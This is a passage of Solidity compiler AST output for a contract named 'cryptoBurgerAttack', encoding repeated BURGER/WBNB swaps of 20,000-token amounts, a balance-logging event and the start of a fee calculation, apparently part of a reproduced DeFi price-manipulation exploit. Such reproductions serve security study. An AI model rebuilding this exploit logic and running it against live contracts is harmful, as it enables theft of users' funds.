                      },
                      {
                        "id": 1272,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "11169:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1275,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1273,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11175:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1274,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11183:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "11175:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1276,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11189:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1281,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "11208:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1280,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11200:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1279,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11200:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1282,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11200:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1278,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "11192:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1277,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "11192:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1283,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11192:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1270,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "11154:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1284,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11154:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1285,
                  "nodeType": "ExpressionStatement",
                  "src": "11154:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1287,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "11232:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1288,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "11240:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1291,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1289,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11246:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1290,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11254:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "11246:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1292,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11260:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1297,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "11279:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1296,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11271:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1295,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11271:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1298,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11271:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1294,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "11263:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1293,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "11263:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1299,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11263:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1286,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "11225:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1300,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11225:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1301,
                  "nodeType": "ExpressionStatement",
                  "src": "11225:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1303,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "11303:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1304,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "11311:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1307,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1305,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11317:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1306,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11325:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "11317:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1308,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11331:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1313,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "11350:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1312,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11342:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1311,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11342:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1314,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11342:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1310,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "11334:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1309,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "11334:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1315,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11334:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1302,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "11296:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1316,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11296:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1317,
                  "nodeType": "ExpressionStatement",
                  "src": "11296:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1319,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "11388:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1320,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "11408:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1325,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "11461:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1324,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11453:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1323,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11453:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1326,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11453:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1321,
                            "name": "BURGER_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 58,
                            "src": "11426:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1322,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "11426:26:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1327,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11426:41:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1328,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11481:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1333,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "11512:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1332,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11504:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1331,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11504:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1334,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11504:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1330,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "11496:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1329,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "11496:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1335,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11496:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1318,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "11368:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1336,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11368:160:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1337,
                  "nodeType": "ExpressionStatement",
                  "src": "11368:160:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "425552472062616c616e6365206f6620636f6e74726163742061667465722073776170",
                        "id": 1339,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11561:37:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_12c762668e05b2f58fc1df784a1089285627a36faceb57943156e9fe8b53613e",
                          "typeString": "literal_string \"BURG balance of contract after swap\""
                        },
                        "value": "BURG balance of contract after swap"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1344,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "11647:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1343,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11639:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1342,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11639:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1345,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11639:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1340,
                            "name": "BURGER_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 58,
                            "src": "11612:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1341,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "11612:26:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1346,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11612:41:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_12c762668e05b2f58fc1df784a1089285627a36faceb57943156e9fe8b53613e",
                          "typeString": "literal_string \"BURG balance of contract after swap\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 1338,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "11544:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 1347,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11544:119:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1348,
                  "nodeType": "EmitStatement",
                  "src": "11539:124:0"
                },
                {
                  "assignments": [
                    1350
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 1350,
                      "mutability": "mutable",
                      "name": "fee",
                      "nameLocation": "11714:3:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "11706:11:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 1349,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "11706:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 1360,
                  "initialValue": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 1359,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "components": [
                        {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 1356,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
